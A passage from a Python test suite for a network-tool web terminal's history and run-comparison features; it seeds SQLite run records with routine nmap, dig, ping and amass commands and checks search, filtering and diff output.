                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    "artifact-search-run-1",
                    session,
                    run_ids[0],
                    "darklab/findings.txt",
                    "findings.txt",
                    "output",
                    42,
                    "workspace_flag",
                    "2026-01-01T00:00:02",
                ),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'answer found', 'darklab.sh has address 104.21.4.35', 0, ?, ?)",
                ("finding-search-run-1", session, run_ids[0], "fp-search-run-1", "2026-01-01T00:00:02"),
            )
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'run', ?, 'baseline', ?)",
                ("label-search-run-1", session, run_ids[0], "2026-01-01T00:00:02"),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'run', ?, 'review note', ?, ?)",
                (
                    "note-search-run-1",
                    session,
                    run_ids[0],
                    "2026-01-01T00:00:02",
                    "2026-01-01T00:00:02",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "ping darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.commit()
            conn.close()

            resp = client.get("/history?q=dig", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["dig darklab.sh A"]
            assert data["runs"][0]["artifact_count"] == 1
            assert data["runs"][0]["artifacts"][0]["workspace_path"] == "darklab/findings.txt"
            assert data["runs"][0]["finding_count"] == 1
            assert data["runs"][0]["label_count"] == 1
            assert data["runs"][0]["note_count"] == 1
            assert data["runs"][0]["labels"][0]["label"] == "baseline"
            assert data["runs"][0]["note"]["body"] == "review note"
            assert data["items"][0]["artifact_count"] == 1
            assert data["items"][0]["finding_count"] == 1
            assert data["items"][0]["label_count"] == 1
            assert data["items"][0]["note_count"] == 1
            assert data["items"][0]["labels"][0]["label"] == "baseline"
            assert data["items"][0]["note"]["body"] == "review note"
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM run_file_artifacts WHERE run_id = ?", (run_ids[0],))
            conn.execute("DELETE FROM findings WHERE run_id = ?", (run_ids[0],))
            conn.execute("DELETE FROM entity_labels WHERE entity_id = ?", (run_ids[0],))
            conn.execute("DELETE FROM entity_notes WHERE entity_id = ?", (run_ids[0],))
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_command_scope_excludes_output_matches(self):
        client = get_client()
        session = "history-command-scope-session"
        run_ids = ["command-scope-1", "command-scope-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_search_text) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[0],
                    session,
                    "file list",
                    "2026-01-01T00:00:01",
                    "2026-01-01T00:00:02",
                    0,
                    "[]",
                    "amass results.txt",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_search_text) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[1],
                    session,
                    "amass enum -d darklab.sh",
                    "2026-01-01T00:00:03",
                    "2026-01-01T00:00:04",
                    0,
                    "[]",
                    "",
                ),
            )
            conn.commit()
            conn.close()

            resp = client.get("/history?type=runs&scope=command&q=amass", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["amass enum -d darklab.sh"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_filters_by_command_root(self):
        client = get_client()
        session = "history-root-session"
        run_ids = ["root-run-1", "root-run-2", "root-run-3"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "nmap -sV darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]", 1),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "nmap -Pn darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]", 0),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "dig darklab.sh A", "2026-01-01T00:00:05", "2026-01-01T00:00:06", 0, "[]", 1),
            )
            conn.commit()
            conn.close()

            resp = client.get("/history?command_root=nmap", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["nmap -Pn darklab.sh", "nmap -sV darklab.sh"]
            assert data["roots"] == ["nmap"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_filters_by_exit_code_and_recent_date_range(self):
        client = get_client()
        session = "history-date-session"
        run_ids = ["date-run-1", "date-run-2", "date-run-3", "date-run-4"]
        recent = datetime.now().replace(microsecond=0)
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "curl recent ok", recent.isoformat(), (recent + timedelta(seconds=2)).isoformat(), 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[1],
                    session,
                    "curl recent fail",
                    (recent - timedelta(hours=1)).isoformat(),
                    (recent - timedelta(hours=1) + timedelta(seconds=2)).isoformat(),
                    2,
                    "[]",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[2],
                    session,
                    "curl old fail",
                    (recent - timedelta(days=40)).isoformat(),
                    (recent - timedelta(days=40) + timedelta(seconds=2)).isoformat(),
                    2,
                    "[]",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[3],
                    session,
                    "ping stopped",
                    (recent - timedelta(minutes=30)).isoformat(),
                    (recent - timedelta(minutes=30) + timedelta(seconds=2)).isoformat(),
                    -15,
                    "[]",
                ),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?exit_code=nonzero&date_range=24h",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["curl recent fail"]

            resp = client.get(
                "/history?exit_code=-15&date_range=24h",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["ping stopped"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_active_history_returns_running_runs_for_this_session(self):
        client = get_client()
        session = f"session-{uuid.uuid4()}"
        active_runs = [
            {
                "run_id": "run-1",
                "command": "ping darklab.sh",
                "started": "2026-01-01T00:00:00Z",
            }
        ]

        with mock.patch("blueprints.history.active_runs_for_session", return_value=active_runs) as active_mock:
            resp = client.get(
                "/history/active",
                headers={"X-Session-ID": session, "X-Client-ID": "client-1"},
            )

        assert resp.status_code == 200
        assert json.loads(resp.data) == {
            "runs": [
                {
                    **active_runs[0],
                    "schedule_id": "",
                    "scheduled": False,
                    "schedule_owner_kind": "",
                    "schedule_owner_id": "",
                    "watcher_id": "",
                    "schedule_label": "",
                }
            ]
        }
        active_mock.assert_called_once_with(session, client_id="client-1", team_id="")

    def test_compare_candidates_rank_exact_command_before_same_target(self):
        client = get_client()
        session = "compare-candidates-" + uuid.uuid4().hex[:8]
        rows = [
            (
                "cmp-source",
                session,
                "nmap -sV darklab.sh",
                "2026-01-01T00:00:04",
                "2026-01-01T00:00:06",
                0,
                "[]",
            ),
            (
                "cmp-exact",
                session,
                "nmap -sV darklab.sh",
                "2026-01-01T00:00:03",
                "2026-01-01T00:00:05",
                0,
                "[]",
            ),
            (
                "cmp-target",
                session,
                "nmap -Pn darklab.sh",
                "2026-01-01T00:00:02",
                "2026-01-01T00:00:04",
                0,
                "[]",
            ),
            (
                "cmp-root",
                session,
                "nmap scanme.nmap.org",
                "2026-01-01T00:00:01",
                "2026-01-01T00:00:03",
                0,
                "[]",
            ),
        ]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                rows,
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/cmp-source/compare-candidates",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert [item["id"] for item in data["candidates"][:3]] == [
                "cmp-exact",
                "cmp-target",
                "cmp-root",
            ]
            assert data["candidates"][0]["confidence"] == "exact_command"
            assert data["candidates"][1]["confidence"] == "same_target"
            assert data["candidates"][2]["confidence"] == "same_command"
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_hunk_line_diff_handles_insert_delete_and_equal_context(self):
        entries = lambda values: [  # noqa: E731 - compact test fixture builder
            {"text": value, "line_index": index} for index, value in enumerate(values)
        ]
        diff = run_comparison.hunk_line_diff(
            entries(["same", "service old"]),
            entries(["same", "service new", "extra"]),
            inline_context=1,
        )

        assert diff["totals"] == {
            "left_total_lines": 2,
            "right_total_lines": 3,
            "equal_line_count": 1,
            "changed_line_count": 1,
            "added_line_count": 1,
            "removed_line_count": 0,
        }
        assert [hunk["op"] for hunk in diff["hunks"]] == ["equal", "replace"]
        assert diff["hunks"][0]["left"]["lines"][0]["text"] == "same"
        assert diff["hunks"][1]["right"]["lines"][diff["hunks"][1]["right_unpaired"][0]]["text"] == "extra"
        buckets = run_comparison.density_buckets_for_hunks(diff["hunks"], bucket_count=4)
        assert len(buckets) == 4
        assert sum(
            bucket["equal"] + bucket["added"] + bucket["removed"] + bucket["changed"]
            for bucket in buckets
        ) == 3
        assert buckets[-1]["end"] == 3
        assert run_comparison.density_bucket_tone({
            "equal": 3, "added": 1, "removed": 0, "changed": 1,
        }) == "changed"
        assert run_comparison.density_bucket_tone({
            "equal": 3, "added": 2, "removed": 1, "changed": 0,
        }) == "added"
        assert run_comparison.density_bucket_tone({
            "equal": 3, "added": 2, "removed": 2, "changed": 0,
        }) == "removed"
        empty_buckets = run_comparison.density_buckets_for_hunks([], bucket_count=4)
        assert len(empty_buckets) == 4
        assert all(bucket == {
            "start": 0, "end": 0, "equal": 0, "added": 0, "removed": 0, "changed": 0,
        } for bucket in empty_buckets)

        long_equal = run_comparison.hunk_line_diff(
            entries(["a", "b", "c", "d", "e", "old"]),
            entries(["a", "b", "c", "d", "e", "new"]),
            inline_context=2,
        )
        equal_hunk = long_equal["hunks"][0]
        assert equal_hunk["op"] == "equal"
        assert "lines" not in equal_hunk["left"]
        assert [item["text"] for item in equal_hunk["context"]["leading"]["left"]] == ["a", "b"]
        assert [item["text"] for item in equal_hunk["context"]["trailing"]["right"]] == ["d", "e"]
        assert equal_hunk["context"]["omitted"] == 1

    def test_compare_line_events_reports_structural_changes_by_line_index(self):
        diff = run_comparison.compare_line_events(
            [
                LineEvent(text="same", line_index=0),
                LineEvent(text="service open", line_index=1),
            ],
            [
                LineEvent(text="same", line_index=0),
                LineEvent(text="service open", role=LineRole.section_header, line_index=1),
                LineEvent(text="extra", line_index=2),
            ],
        )

        assert [hunk["op"] for hunk in diff["hunks"]] == ["equal", "replace"]
        assert diff["totals"]["equal_line_count"] == 1
        assert diff["totals"]["changed_line_count"] == 1
        assert diff["totals"]["added_line_count"] == 1
        pair = diff["hunks"][1]["changed_pairs"][0]
        assert pair["structural_change"] is True
        assert pair["structural"] == {
            "left": {"kind": "info", "role": "body"},
            "right": {"kind": "info", "role": "section-header"},
        }
        assert diff["hunks"][1]["left"]["lines"][0]["role"] == "body"
        assert diff["hunks"][1]["right"]["lines"][0]["role"] == "section-header"

    def test_compare_full_output_falls_back_to_preview_when_artifact_is_missing(self):
        events, source, partial = run_comparison.compare_full_output_events({
            "id": "cmp-missing-artifact",
            "session_id": "test-session",
            "output_preview": json.dumps([{"text": "preview fallback", "cls": ""}]),
            "preview_truncated": False,
            "full_output_available": True,
            "full_output_truncated": False,
            "rel_path": "missing-compare-artifact.txt.gz",
        })

        assert [event.text for event in events] == ["preview fallback"]
        assert source == "preview"
        assert partial is True

    def test_compare_route_falls_back_to_preview_when_full_artifact_is_corrupt(self):
        from services.runs.output_store import RUN_OUTPUT_DIR, ensure_run_output_dir

        client = get_client()
        session = "compare-corrupt-artifact-" + uuid.uuid4().hex[:8]
        left_id = "cmp-corrupt-left"
        right_id = "cmp-corrupt-right"
        rel_path = f"{left_id}.txt.gz"
        artifact_path = Path(RUN_OUTPUT_DIR) / rel_path
        try:
            ensure_run_output_dir()
            artifact_path.write_bytes(b"not a gzip transcript")
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count, full_output_available, full_output_truncated) "
                "VALUES (?, ?, 'nmap darklab.sh', datetime('now'), datetime('now'), 0, ?, 1, ?, 0)",
                [
                    (left_id, session, json.dumps([{"text": "left preview", "cls": "", "line_index": 0}]), 1),
                    (right_id, session, json.dumps([{"text": "right preview", "cls": "", "line_index": 0}]), 0),
                ],
            )
            conn.execute(
                "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size, line_count, truncated, created) "
                "VALUES (?, ?, 'gzip', ?, 1, 0, datetime('now'))",
                (left_id, rel_path, artifact_path.stat().st_size),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                f"/history/compare?left={left_id}&right={right_id}",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["left"]["output_source"]["source"] == "preview"
            assert data["left"]["output_source"]["partial"] is True
            assert data["right"]["output_source"]["source"] == "preview"
            hunk_texts = [
                line["text"]
                for hunk in data["hunks"]
                for side in ("left", "right")
                for line in hunk.get(side, {}).get("lines", [])
            ]
            assert "left preview" in hunk_texts
            assert "right preview" in hunk_texts
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM run_output_artifacts WHERE run_id = ?", (left_id,))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()
            try:
                artifact_path.unlink()
            except FileNotFoundError:
                pass

    def test_hunk_line_diff_handles_uneven_replace_pairing(self):
        entries = lambda values: [  # noqa: E731 - compact test fixture builder
            {"text": value, "line_index": index} for index, value in enumerate(values)
        ]
        diff = run_comparison.hunk_line_diff(
            entries([
                "alpha service open",
                "beta service open",
                "left-only value",
            ]),
            entries([
                "alpha service closed",
                "beta service closed",
            ]),
        )

        hunk = diff["hunks"][0]
        assert hunk["op"] == "replace"
        assert [(item["left_index"], item["right_index"]) for item in hunk["changed_pairs"]] == [(0, 0), (1, 1)]
        assert hunk["left_unpaired"] == [2]
        assert hunk["right_unpaired"] == []
        assert diff["totals"]["changed_line_count"] == 2
        assert diff["totals"]["removed_line_count"] == 1
        assert any(
            segment["changed"]
            for segment in hunk["changed_pairs"][0]["segments"]["left"]
        )

    def test_hunk_line_diff_keeps_unrelated_and_long_replace_lines_unpaired(self):
        unrelated = run_comparison.hunk_line_diff(
            [
                {"text": "left aaa", "line_index": 0},
                {"text": "left bbb", "line_index": 1},
            ],
            [
                {"text": "right yyy", "line_index": 0},
                {"text": "right zzz", "line_index": 1},
            ],
            max_changed_lines=10,
        )
        unrelated_hunk = unrelated["hunks"][0]
        assert unrelated_hunk["changed_pairs"] == []
        assert unrelated_hunk["left_unpaired"] == [0, 1]
        assert unrelated_hunk["right_unpaired"] == [0, 1]

        long_left = "scanner " + ("a" * run_comparison.COMPARE_LINE_DISPLAY_TRUNCATE) + " old"
        long_right = "scanner " + ("a" * run_comparison.COMPARE_LINE_DISPLAY_TRUNCATE) + " new"
        long_diff = run_comparison.hunk_line_diff(
            [{"text": long_left, "line_index": 0}],
            [{"text": long_right, "line_index": 0}],
        )
        long_hunk = long_diff["hunks"][0]
        assert long_hunk["changed_pairs"] == []
        assert long_hunk["left_unpaired"] == [0]
        assert long_hunk["right_unpaired"] == [0]

    def test_replace_pairing_uses_quick_ratio_before_full_ratio(self, monkeypatch):
        calls = {"quick_ratio": 0, "ratio": 0}

        class CheapRejectMatcher:
            def __init__(self, *_args, **_kwargs):
                pass

            def quick_ratio(self):
                calls["quick_ratio"] += 1
                return 0.1

            def ratio(self):
                calls["ratio"] += 1
                return 1.0

        monkeypatch.setattr(run_comparison, "SequenceMatcher", CheapRejectMatcher)
        hunk = run_comparison.compare_replace_hunk(
            [
                {"text": "left alpha", "line_index": 0},
                {"text": "left beta", "line_index": 1},
            ],
            [
                {"text": "right gamma", "line_index": 0},
                {"text": "right delta", "line_index": 1},
            ],
            0,
            2,
            0,
            2,
        )

        assert hunk["changed_pairs"] == []
        assert hunk["left_unpaired"] == [0, 1]
        assert hunk["right_unpaired"] == [0, 1]
        assert calls["quick_ratio"] > 0
        assert calls["ratio"] == 0

    def test_hunk_line_diff_preserves_one_to_one_replace_pairing_below_threshold(self):
        diff = run_comparison.hunk_line_diff(
            [{"text": "abcde", "line_index": 0}],
            [{"text": "vwxyz", "line_index": 0}],
        )

        hunk = diff["hunks"][0]
        assert hunk["op"] == "replace"
        assert [(item["left_index"], item["right_index"]) for item in hunk["changed_pairs"]] == [(0, 0)]
        assert hunk["left_unpaired"] == []
        assert hunk["right_unpaired"] == []

    def test_hunk_line_diff_reports_budget_exhaustion(self):
        entries = lambda prefix, count: [  # noqa: E731 - compact test fixture builder
            {"text": f"{prefix}-{index}", "line_index": index} for index in range(count)
        ]
        line_limited = run_comparison.hunk_line_diff(
            entries("left", 4),
            entries("right", 4),
            max_changed_lines=3,
            max_hunks=10,
        )

        assert line_limited["truncated"]["lines_omitted"]["total"] == 5
        assert line_limited["truncated"]["hunks_omitted"] == 0
        hunk = line_limited["hunks"][0]
        assert hunk["lines_omitted"]["total"] == 5
        assert run_comparison.change_hunk_units(hunk) == 3
        assert line_limited["totals"]["changed_line_count"] == len(hunk["changed_pairs"])
        assert line_limited["totals"]["removed_line_count"] == len(hunk["left_unpaired"])
        assert line_limited["totals"]["added_line_count"] == len(hunk["right_unpaired"])

        hunk_limited = run_comparison.hunk_line_diff(
            [
                {"text": "a", "line_index": 0},
                {"text": "same", "line_index": 1},
                {"text": "b", "line_index": 2},
            ],
            [
                {"text": "c", "line_index": 0},
                {"text": "same", "line_index": 1},
                {"text": "d", "line_index": 2},
            ],
            max_changed_lines=10,
            max_hunks=1,
        )
        assert hunk_limited["truncated"]["hunks_omitted"] == 1
        assert hunk_limited["truncated"]["lines_omitted"] == {
            "left": 1,
            "right": 1,
            "total": 2,
        }
        assert hunk_limited["totals"]["changed_line_count"] == 1
        assert hunk_limited["totals"]["removed_line_count"] == 0
        assert hunk_limited["totals"]["added_line_count"] == 0

        line_cap_exhausted = run_comparison.hunk_line_diff(
            [
                {"text": "a", "line_index": 0},
                {"text": "same", "line_index": 1},
                {"text": "b", "line_index": 2},
            ],
            [
                {"text": "c", "line_index": 0},
                {"text": "same", "line_index": 1},
                {"text": "d", "line_index": 2},
            ],
            max_changed_lines=2,
            max_hunks=10,
        )
        assert line_cap_exhausted["truncated"]["hunks_omitted"] == 1
        assert line_cap_exhausted["truncated"]["lines_omitted"] == {
            "left": 1,
            "right": 1,
            "total": 2,
        }
        assert line_cap_exhausted["totals"]["changed_line_count"] == 1
        assert line_cap_exhausted["totals"]["removed_line_count"] == 0
        assert line_cap_exhausted["totals"]["added_line_count"] == 0

    def test_compare_history_lines_returns_filtered_output_slices(self):
        client = get_client()
        session = "compare-lines-" + uuid.uuid4().hex[:8]
        output = json.dumps([
            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
            {"text": "alpha", "cls": "", "line_index": 0},
            {
                "text": "rate:  0.10-kpps, 49.90% done,   0:00:09 remaining, found=2",
                "role": "progress",
                "noise_kind": "progress",
                "line_index": 1,
            },
            {"text": "beta", "cls": "", "line_index": 2},
            {"text": "gamma", "cls": "", "line_index": 3},
            {"text": "[process exited with code 0]", "cls": "exit-ok"},
        ])
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'nmap darklab.sh', datetime('now'), ?, 3)",
                [
                    ("cmp-lines-left", session, output),
                    ("cmp-lines-right", session, output),
                ],
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/compare/lines?left=cmp-lines-left&right=cmp-lines-right"
                "&side=a&start=1&end=3",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)
            compare_resp = client.get(
                "/history/compare?left=cmp-lines-left&right=cmp-lines-right",
                headers={"X-Session-ID": session},
            )
            compare_data = json.loads(compare_resp.data)

            assert resp.status_code == 200
            assert data["start"] == 1
            assert data["end"] == 3
            assert data["truncated"] is False
            assert [item["text"] for item in data["lines"]] == ["beta", "gamma"]
            assert data["lines"][0]["line_index"] == 2
            assert compare_resp.status_code == 200
            assert compare_data["left"]["output_source"]["noise_lines_omitted"] == 1
            assert compare_data["left"]["output_source"]["noise_kind_counts"] == {"progress": 1}
            assert compare_data["right"]["output_source"]["noise_lines_omitted"] == 1
            assert "0.10-kpps" not in json.dumps(compare_data["hunks"])
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_compare_history_lines_rejects_invalid_ranges_and_clamps_stale_ranges(self):
        client = get_client()
        session = "compare-lines-invalid-" + uuid.uuid4().hex[:8]
        other_session = "compare-lines-other-" + uuid.uuid4().hex[:8]
        output = json.dumps([{"text": "alpha", "cls": "", "line_index": 0}])
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'nmap darklab.sh', datetime('now'), ?, 1)",
                [
                    ("cmp-lines-invalid-left", session, output),
                    ("cmp-lines-invalid-right", session, output),
                    ("cmp-lines-invalid-other", other_session, output),
                ],
            )
            conn.commit()
            conn.close()

            invalid_side = client.get(
                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right"
                "&side=x&start=0&end=1",
                headers={"X-Session-ID": session},
            )
            out_of_range = client.get(
                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right"
                "&side=a&start=0&end=2",
                headers={"X-Session-ID": session},
            )
            stale_start = client.get(
                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right"
                "&side=a&start=2&end=4",
                headers={"X-Session-ID": session},
            )
            cross_session = client.get(
                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-other"
                "&side=a&start=0&end=1",
                headers={"X-Session-ID": session},
            )

            assert invalid_side.status_code == 400
            assert out_of_range.status_code == 200
            out_of_range_payload = json.loads(out_of_range.data)
            assert [item["text"] for item in out_of_range_payload["lines"]] == ["alpha"]
            assert out_of_range_payload["end"] == 1
            assert out_of_range_payload["truncated"] is True
            assert out_of_range_payload["range_clamped"] is True
            assert "requested range exceeded" in out_of_range_payload["note"]
            assert stale_start.status_code == 200
            stale_start_payload = json.loads(stale_start.data)
            assert stale_start_payload["lines"] == []
            assert stale_start_payload["start"] == 1
            assert stale_start_payload["end"] == 1
            assert stale_start_payload["truncated"] is True
            assert stale_start_payload["range_clamped"] is True
            assert cross_session.status_code == 404
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id IN (?, ?)", (session, other_session))
            conn.commit()
            conn.close()

    def test_compare_history_lines_paginates_by_line_and_byte_limits(self):
        client = get_client()
        session = "compare-lines-limit-" + uuid.uuid4().hex[:8]
        output = json.dumps([
            {"text": "aaaa", "cls": "", "line_index": 0},
            {"text": "bbbb", "cls": "", "line_index": 1},
            {"text": "cccc", "cls": "", "line_index": 2},
        ])
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'nmap darklab.sh', datetime('now'), ?, 3)",
                [
                    ("cmp-lines-limit-left", session, output),
                    ("cmp-lines-limit-right", session, output),
                ],
            )
            conn.commit()
            conn.close()

            with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_PAGE_LIMIT", 2):
                line_limited = client.get(
                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
                    "&side=a&start=0&end=3",
                    headers={"X-Session-ID": session},
                )
            line_data = json.loads(line_limited.data)
            assert line_limited.status_code == 200
            assert [item["text"] for item in line_data["lines"]] == ["aaaa", "bbbb"]
            assert line_data["end"] == 2
            assert line_data["truncated"] is True
            assert line_data["page_limit"] == 2

            with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_BYTE_LIMIT", 5):
                byte_limited = client.get(
                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
                    "&side=a&start=0&end=3",
                    headers={"X-Session-ID": session},
                )
            byte_data = json.loads(byte_limited.data)
            assert byte_limited.status_code == 200
            assert [item["text"] for item in byte_data["lines"]] == ["aaaa"]
            assert byte_data["end"] == 1
            assert byte_data["truncated"] is True
            assert byte_data["byte_limit"] == 5

            with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_BYTE_LIMIT", 3):
                oversized_line = client.get(
                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
                    "&side=a&start=0&end=3",
                    headers={"X-Session-ID": session},
                )
            oversized_data = json.loads(oversized_line.data)
            assert oversized_line.status_code == 200
            assert [item["text"] for item in oversized_data["lines"]] == ["aaaa"]
            assert oversized_data["end"] == 1
            assert oversized_data["truncated"] is True
            assert oversized_data["byte_limit"] == 3
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_compare_history_runs_returns_metadata_and_changed_lines(self):
        client = get_client()
        session = "compare-runs-" + uuid.uuid4().hex[:8]
        left_output = json.dumps([
            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
            {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:22 UTC", "cls": ""},
            {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
            {"text": "8080/tcp open http-proxy", "cls": "", "signals": ["findings"], "line_index": 1},
            {"text": "[process exited with code 0]", "cls": "exit-ok"},
        ])
        right_output = json.dumps([
            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
            {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:21 UTC", "cls": ""},
            {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
            {"text": "443/tcp open https", "cls": "", "signals": ["findings"], "line_index": 1},
            {"text": "[process exited with code 0]", "cls": "exit-ok"},
        ])
        left_web_output = json.dumps([
            {
                "text": "https://darklab.sh [200] [Old title]",
                "cls": "",
                "signals": ["findings"],
                "line_index": 0,
                "entities": [{
                    "type": "url",
                    "value": "https://darklab.sh",
                    "canonical_value": "https://darklab.sh",
                    "confidence": "medium",
                }],
            },
            {
                "text": "https://darklab.sh/login [404] [Login]",
                "cls": "",
                "signals": ["findings"],
                "line_index": 1,
                "entities": [{
                    "type": "url",
                    "value": "https://darklab.sh/login",
                    "canonical_value": "https://darklab.sh/login",
                    "confidence": "medium",
                }],
            },
        ])
        right_web_output = json.dumps([
            {
                "text": "https://darklab.sh [301] [New title]",
                "cls": "",
                "signals": ["findings"],
                "line_index": 0,
                "entities": [{
                    "type": "url",
                    "value": "https://darklab.sh",
                    "canonical_value": "https://darklab.sh",
                    "confidence": "medium",
                }],
            },
            {
                "text": "https://darklab.sh/admin [200] [Admin]",
                "cls": "",
                "signals": ["findings"],
                "line_index": 1,
                "entities": [{
                    "type": "url",
                    "value": "https://darklab.sh/admin",
                    "canonical_value": "https://darklab.sh/admin",
                    "confidence": "medium",
                }],
            },
        ])
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                [
                    (
                        "cmp-left",
                        session,
                        "nmap darklab.sh",
                        "2026-01-01T00:00:01",
                        "2026-01-01T00:00:03",
                        0,
                        left_output,
                        4,
                    ),
                    (
                        "cmp-right",
                        session,
                        "nmap darklab.sh",
                        "2026-01-01T00:00:04",
                        "2026-01-01T00:00:09",
                        0,
                        right_output,
                        4,
                    ),
                    (
